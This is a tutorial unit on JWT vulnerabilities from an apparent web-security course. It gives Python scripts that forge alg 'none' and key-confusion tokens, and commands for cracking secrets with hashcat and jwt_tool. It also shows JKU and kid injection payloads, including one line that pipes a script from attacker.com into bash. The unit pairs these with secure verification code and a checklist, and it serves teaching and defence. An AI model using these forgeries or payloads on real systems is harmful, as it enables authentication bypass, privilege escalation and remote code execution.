# Unit 1: A01 - Broken Access Control — Topic 5: JWT Vulnerabilities

## Overview

JSON Web Tokens (JWT) are widely used for stateless authentication and authorization in modern web applications and APIs. However, improper implementation creates severe vulnerabilities that allow attackers to **forge tokens, escalate privileges, bypass authentication, and impersonate any user**. JWT-related flaws include algorithm confusion attacks, weak secret brute-forcing, JWK/JKU injection, kid parameter injection, and claim manipulation. Understanding these attacks is critical for both offensive testing and secure implementation.

---

## 1. JWT Structure Deep Dive

### Token Anatomy

```
┌─────────────────────────────────────────────────────────────────┐
│                       JWT STRUCTURE                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature           │
│  ───────────────────── ─────────────────── ──────────          │
│       HEADER              PAYLOAD           SIGNATURE           │
│    (Base64URL)          (Base64URL)        (Base64URL)          │
│                                                                 │
│  Header:                 Payload:           Signature:          │
│  {                       {                  RSASHA256(          │
│    "alg": "RS256",         "sub": "123",     base64UrlEncode(  │
│    "typ": "JWT",           "role": "user",    header) + "." +  │
│    "kid": "key-1"          "iat": 17040672,   base64UrlEncode( │
│  }                         "exp": 17041336    payload),        │
│                          }                   privateKey        │
│                                             )                   │
└─────────────────────────────────────────────────────────────────┘
```

### Common JWT Claims

| Claim | Name | Description |
|-------|------|-------------|
| `iss` | Issuer | Who issued the token |
| `sub` | Subject | User identifier |
| `aud` | Audience | Intended recipient |
| `exp` | Expiration | Expiry timestamp |
| `nbf` | Not Before | Valid after this time |
| `iat` | Issued At | When token was created |
| `jti` | JWT ID | Unique identifier (prevents replay) |
| `role` | Role | Custom: user's role |
| `scope` | Scope | Custom: authorized scopes |

### Signing Algorithms

| Algorithm | Type | Security |
|-----------|------|----------|
| **HS256** | Symmetric (HMAC-SHA256) | Shared secret — must be strong |
| **HS384** | Symmetric (HMAC-SHA384) | Stronger hash |
| **HS512** | Symmetric (HMAC-SHA512) | Strongest HMAC |
| **RS256** | Asymmetric (RSA-SHA256) | Private key signs, public key verifies |
| **RS384** | Asymmetric (RSA-SHA384) | Stronger RSA |
| **RS512** | Asymmetric (RSA-SHA512) | Strongest RSA |
| **ES256** | Asymmetric (ECDSA-SHA256) | Elliptic curve (shorter keys) |
| **PS256** | Asymmetric (RSA-PSS-SHA256) | Probabilistic padding |
| **none** | None | ⚠️ NO signature — should be rejected |

---

## 2. Algorithm "none" Attack

The most basic JWT attack: set the algorithm to "none" and remove the signature.

```
┌─────────────────────────────────────────────────────────────────┐
│                  ALGORITHM NONE ATTACK                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Original Token:                                                │
│  Header: {"alg": "HS256", "typ": "JWT"}                       │
│  Payload: {"sub": "user123", "role": "user"}                   │
│  Signature: HMACSHA256(header.payload, secret)                  │
│                                                                 │
│  Forged Token:                                                  │
│  Header: {"alg": "none", "typ": "JWT"}                         │
│  Payload: {"sub": "user123", "role": "admin"}  ← modified     │
│  Signature: (empty)                             ← removed      │
│                                                                 │
│  Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.                 │
│          eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.         │
│                                                                 │
│  If server accepts "none" algorithm → Full bypass!             │
└─────────────────────────────────────────────────────────────────┘
```

### Exploitation

```python
import base64
import json

def forge_none_token(payload):
    """Create a JWT with algorithm 'none'"""
    header = {"alg": "none", "typ": "JWT"}
    
    # Base64URL encode
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    
    # Token with empty signature (trailing dot)
    return f"{h}.{p}."

# Forge admin token
admin_token = forge_none_token({
    "sub": "user123",
    "role": "admin",
    "iat": 1704067200,
    "exp": 9999999999
})
print(f"Forged token: {admin_token}")

# Variations that bypass filters
# "none", "None", "NONE", "nOnE", "none\x00"
for alg in ["none", "None", "NONE", "nOnE"]:
    token = forge_none_token({"sub": "admin", "role": "admin"})
    print(f"Algorithm '{alg}': {token[:50]}...")
```

### Vulnerable Server Code

```python
# VULNERABLE — Accepts any algorithm
import jwt

def verify_token(token):
    payload = jwt.decode(token, SECRET_KEY, algorithms=None)  # ← No algorithm restriction!
    return payload

# SECURE — Explicit algorithm whitelist
def verify_token(token):
    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # ← Only HS256 accepted
    return payload
```

---

## 3. Algorithm Confusion Attack (RS256 → HS256)

When a server uses RS256 (asymmetric), an attacker can switch to HS256 (symmetric) and sign with the **public key** (which is often publicly available).

```
┌─────────────────────────────────────────────────────────────────┐
│               ALGORITHM CONFUSION ATTACK                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Normal Flow (RS256):                                          │
│  Server signs with PRIVATE key                                 │
│  Server verifies with PUBLIC key                               │
│                                                                 │
│  Attack Flow (RS256 → HS256):                                  │
│  1. Attacker obtains server's PUBLIC key                       │
│     (from /jwks, /.well-known/jwks.json, certificate)         │
│  2. Changes algorithm in header from RS256 to HS256            │
│  3. Signs token using PUBLIC key as HMAC secret                │
│  4. Server's verify function uses:                              │
│     jwt.verify(token, publicKey, algorithms=['RS256','HS256'])  │
│     Since alg=HS256, it treats publicKey as HMAC secret        │
│     HMAC(publicKey, header.payload) matches → TOKEN ACCEPTED!  │
│                                                                 │
│  KEY INSIGHT: The public key is known to the attacker,         │
│  and with HS256, it's used as the signing secret.              │
└─────────────────────────────────────────────────────────────────┘
```

### Exploitation

```python
import jwt
import requests

# Step 1: Obtain public key
public_key = requests.get('https://target.com/.well-known/jwks.json').json()
# Or extract from certificate:
# openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > public.pem

# Step 2: Read public key
with open('public.pem', 'r') as f:
    public_key_pem = f.read()

# Step 3: Forge token signed with public key as HMAC secret
forged_payload = {
    "sub": "admin",
    "role": "admin",
    "exp": 9999999999
}

# Sign with HS256 using the public key as the symmetric secret
forged_token = jwt.encode(
    forged_payload,
    public_key_pem,        # Public key used as HMAC secret
    algorithm='HS256'      # Algorithm changed to HS256
)

print(f"Forged token: {forged_token}")
```

### Prevention

```python
# SECURE — Always specify expected algorithm explicitly
def verify_token(token):
    try:
        # Only accept RS256 — rejects HS256 tokens
        payload = jwt.decode(
            token, 
            PUBLIC_KEY, 
            algorithms=['RS256']  # ← Strict algorithm enforcement
        )
        return payload
    except jwt.InvalidAlgorithmError:
        raise AuthenticationError("Invalid token algorithm")
```

---

## 4. Secret Key Brute-Forcing

When HS256 is used with a weak secret, the key can be cracked offline.

### Using hashcat

```bash
# Extract JWT for cracking
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature" > jwt.txt

# Crack with hashcat (mode 16500)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Crack with john
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt_tool brute force
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

### Using jwt_tool

```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git
pip install -r jwt_tool/requirements.txt

# Decode token
python3 jwt_tool.py <token>

# Test for known vulnerabilities
python3 jwt_tool.py <token> -M at    # All tests
python3 jwt_tool.py <token> -M pb    # Playbook mode

# Tamper claims
python3 jwt_tool.py <token> -T       # Interactive tampering
python3 jwt_tool.py <token> -I -pc role -pv admin  # Change role to admin

# Algorithm none attack
python3 jwt_tool.py <token> -X a     # Algorithm "none"

# Key brute force
python3 jwt_tool.py <token> -C -d wordlist.txt  # Dictionary attack

# Algorithm confusion
python3 jwt_tool.py <token> -X k -pk public.pem  # Key confusion
```

### Common Weak Secrets

```
secret
password
key
123456
admin
jwt_secret
my-secret-key
changeme
test
default
application-secret
your-256-bit-secret
supersecret
```

---

## 5. JWK and JKU Injection

### JWK Header Injection

The attacker embeds their own public key in the JWT header.

```
┌─────────────────────────────────────────────────────────────────┐
│                    JWK INJECTION ATTACK                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Normal JWT Header:                                            │
│  {                                                              │
│    "alg": "RS256",                                             │
│    "typ": "JWT"                                                │
│  }                                                              │
│                                                                 │
│  Injected JWT Header:                                          │
│  {                                                              │
│    "alg": "RS256",                                             │
│    "typ": "JWT",                                               │
│    "jwk": {                                                    │
│      "kty": "RSA",                                             │
│      "n": "ATTACKER_PUBLIC_KEY_N",     ← Attacker's key       │
│      "e": "AQAB",                                              │
│      "kid": "attacker-key"                                     │
│    }                                                            │
│  }                                                              │
│                                                                 │
│  If server trusts the embedded JWK for verification:           │
│  → Attacker signs with their private key                       │
│  → Server verifies with attacker's embedded public key         │
│  → Token accepted with forged claims!                          │
└─────────────────────────────────────────────────────────────────┘
```

### JKU (JWK Set URL) Injection

```
Forged Header:
{
    "alg": "RS256",
    "jku": "https://attacker.com/.well-known/jwks.json"  ← Points to attacker's server
}

Attacker's jwks.json:
{
    "keys": [{
        "kty": "RSA",
        "kid": "attacker-key",
        "use": "sig",
        "n": "ATTACKER_KEY_MODULUS",
        "e": "AQAB"
    }]
}

Attack Flow:
1. Generate RSA key pair
2. Host public key at attacker.com/jwks.json
3. Create JWT with jku pointing to attacker's server
4. Sign JWT with attacker's private key
5. Server fetches keys from jku URL → gets attacker's public key
6. Verification succeeds with attacker's key!
```

---

## 6. kid (Key ID) Parameter Injection

The `kid` header parameter specifies which key to use for verification. If the server uses `kid` to construct a file path or database query, it can be injected.

### Path Traversal via kid

```json
{
    "alg": "HS256",
    "kid": "../../../dev/null"
}
```

```
Server code (vulnerable):
key = readFile('/keys/' + header.kid)  
# With kid = "../../../dev/null"
# Reads /dev/null (empty file)
# Signs with empty string as key

Attacker: Sign token with empty string → token accepted!
```

### SQL Injection via kid

```json
{
    "alg": "HS256",
    "kid": "' UNION SELECT 'attacker-secret' -- "
}
```

```
Server code (vulnerable):
query = "SELECT key FROM jwt_keys WHERE kid = '" + header.kid + "'"
# Injected query returns 'attacker-secret' as the key
# Attacker signs with 'attacker-secret' → token accepted!
```

### Command Injection via kid

```json
{
    "alg": "HS256",
    "kid": "key1 | curl attacker.com/shell.sh | bash"
}
```

---

## 7. Claim Manipulation Techniques

### Expiration Bypass

```python
# Set expiration far in the future
forged_payload = {
    "sub": "user123",
    "role": "admin",
    "exp": 99999999999,  # Year 5138
    "iat": 1704067200
}

# Remove expiration entirely
forged_payload = {
    "sub": "user123",
    "role": "admin"
    # No "exp" claim — token never expires if server doesn't require it
}
```

### Subject/Identity Switching

```python
# Change subject to admin user
original = {"sub": "user-abc-123", "role": "user"}
forged   = {"sub": "admin-xyz-789", "role": "admin"}

# Change email claim
original = {"email": "user@company.com", "role": "user"}
forged   = {"email": "admin@company.com", "role": "admin"}
```

---

## 8. Secure JWT Implementation

```python
import jwt
from datetime import datetime, timedelta
from cryptography.hazmat.primitives import serialization

class SecureJWTManager:
    def __init__(self, private_key_path, public_key_path):
        with open(private_key_path, 'rb') as f:
            self.private_key = serialization.load_pem_private_key(f.read(), password=None)
        with open(public_key_path, 'rb') as f:
            self.public_key = serialization.load_pem_public_key(f.read())
    
    def create_token(self, user_id, role, expiry_minutes=15):
        """Create a secure JWT"""
        payload = {
            'sub': user_id,
            'role': role,
            'iat': datetime.utcnow(),
            'exp': datetime.utcnow() + timedelta(minutes=expiry_minutes),
            'iss': 'myapp.com',
            'aud': 'myapp.com',
            'jti': str(uuid.uuid4()),  # Unique token ID for revocation
        }
        return jwt.encode(payload, self.private_key, algorithm='RS256')
    
    def verify_token(self, token):
        """Verify JWT with strict settings"""
        try:
            payload = jwt.decode(
                token,
                self.public_key,
                algorithms=['RS256'],           # Strict algorithm
                issuer='myapp.com',             # Verify issuer
                audience='myapp.com',           # Verify audience
                options={
                    'require': ['exp', 'iat', 'sub', 'iss', 'aud', 'jti'],
                    'verify_exp': True,
                    'verify_iat': True,
                    'verify_iss': True,
                    'verify_aud': True,
                }
            )
            
            # Check if token is revoked
            if self._is_revoked(payload['jti']):
                raise jwt.InvalidTokenError("Token has been revoked")
            
            return payload
        except jwt.ExpiredSignatureError:
            raise AuthError("Token expired")
        except jwt.InvalidAlgorithmError:
            raise AuthError("Invalid algorithm")
        except jwt.InvalidTokenError as e:
            raise AuthError(f"Invalid token: {e}")
    
    def _is_revoked(self, jti):
        """Check token revocation list (Redis/DB)"""
        return redis_client.exists(f"revoked_token:{jti}")
```

### JWT Security Checklist

| Practice | Description |
|----------|-------------|
| **Strict algorithm** | Only accept expected algorithm(s) |
| **Strong secrets** | 256+ bit random secrets for HMAC |
| **Asymmetric keys** | Prefer RS256/ES256 over HS256 |
| **Short expiration** | 15-minute access tokens |
| **Refresh tokens** | Use separate long-lived refresh tokens |
| **Required claims** | Require exp, iat, sub, iss, aud |
| **Token revocation** | Maintain revocation list (JTI blacklist) |
| **No sensitive data** | Never store passwords/PII in JWT payload |
| **Validate all claims** | Verify issuer, audience, expiration |
| **Reject embedded keys** | Don't trust JWK/JKU from token headers |

---

## Summary Table

| Attack | Technique | Impact | Difficulty |
|--------|-----------|--------|-----------|
| **Algorithm None** | Set alg to "none" | Full auth bypass | Easy |
| **Algorithm Confusion** | RS256 → HS256 with public key | Full auth bypass | Medium |
| **Secret Brute Force** | Crack weak HMAC secret | Token forgery | Easy-Medium |
| **JWK Injection** | Embed attacker's key in header | Token forgery | Medium |
| **JKU Injection** | Point to attacker's key server | Token forgery | Medium |
| **kid Injection** | Path traversal/SQLi via kid | Token forgery / RCE | Medium-Hard |
| **Claim Manipulation** | Modify role/sub/exp claims | Privilege escalation | Easy (if key known) |

---

## Revision Questions

1. Explain the JWT structure. What are the three parts and how is each encoded?
2. How does the algorithm "none" attack work? Why do some servers accept it?
3. Describe the RS256 → HS256 algorithm confusion attack step by step. What is the key insight that makes it work?
4. How would you brute-force a JWT HS256 secret using hashcat? What mode number is used?
5. Explain JKU injection. How does an attacker trick the server into using their own signing key?
6. List six best practices for secure JWT implementation. Why is each important?

---

*Previous: [04-privilege-escalation.md](04-privilege-escalation.md) | Next: [06-testing-methodology.md](06-testing-methodology.md)*

---

*[Back to README](../README.md)*
